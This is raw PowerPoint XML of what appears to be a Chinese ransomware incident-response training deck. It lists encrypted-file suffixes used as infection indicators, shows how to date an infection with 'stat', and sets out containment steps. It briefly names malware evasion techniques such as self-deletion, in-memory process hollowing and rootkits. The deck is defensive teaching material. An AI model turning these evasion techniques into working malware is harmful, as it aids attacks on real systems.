                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>pptm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pptx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ppt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xltm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xltx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xlc</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xlw</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xlsb</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xlsm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xlsx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xls</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dotx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dotm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .dot, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>docm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docb</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docx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, .doc</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-C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6322392"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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39D8BC-9A97-334E-ABFD-2223C0605729}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="112474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加密后的文件后缀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22530" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1475656" y="2420888"/>
            <a:ext cx="4968552"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.WNCRYT</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.lock</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pre_alpha</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aes</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aes_ni</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xdata</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.aes_ni_0day</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN"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 </a:t>
            </a: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.pr0tect</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.[stopstorage@qq.com].java</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1259632" y="1844824"/>
            <a:ext cx="2646878" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>文件后缀无变化；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20964674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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="22530"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="225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771329-5BFA-D448-A434-7DCFC7FE78B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="112474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确认感染时间</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23554" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="755576" y="1848381"/>
            <a:ext cx="8330803" cy="18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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>系统</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pP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执行命令</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stat[</a:t>
            </a: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空格</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a:t>
            </a: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文件名，包括三个时间</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access time</a:t>
            </a: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（访问时间）、</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modify time</a:t>
            </a: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（内容修改时间）、</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change time</a:t>
            </a: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（属性改变时间），如：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pP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例：</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stat /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>etc</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>passwd</a:t>
            </a:r>
            <a:endPar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endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="3861048"/>
            <a:ext cx="5832648" cy="1061829"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>系统</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>例：右键查看文件属性，查看文件时间</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1118049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3554"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23554"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2355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p:bldP spid="3"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864DC2-1614-BE47-8026-423A8D53D37B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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处理方式</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24578" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971600" y="1628800"/>
            <a:ext cx="684639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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
              <a:defRPr kumimoji="1" sz="2000" b="1">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endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>未被感染主机：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>关闭</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SSH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RDP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等协议，并且更改主机密码；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>备份系统重要数据、且文件备份应与主机隔离；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>禁止接入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>U</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>盘、移动硬盘等可执行摆渡攻击的设备；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29883083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4578"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24578"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="245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58D1D9-FF47-D54F-961E-4AB671B13CE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544"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处理方式</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25602" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="683568" y="1844824"/>
            <a:ext cx="799288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zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>被感染主机</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>立即</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>对被感染主机进行隔离处置</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，禁用所有有线及无线网卡或直接拔掉网线，防止病毒感染其他主机；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>禁止在被感染主机上使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>U</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>盘、移动硬盘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>等可执行摆渡攻击的设备；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10984780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5602"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25602"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="256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936641-460E-6F49-B78D-CB1C12D21C78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560"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处理方式</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 name="文本框 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{392CDA86-360B-0A4E-B24E-942BA4CD4614}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1772816"/>
            <a:ext cx="7850981" cy="2262158"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>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FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>无法定位到文件？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>木马执行完毕后自删除</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>采用傀儡进程技术，恶意代码只在内存展开执行</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>高级</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Rootkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Bootkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
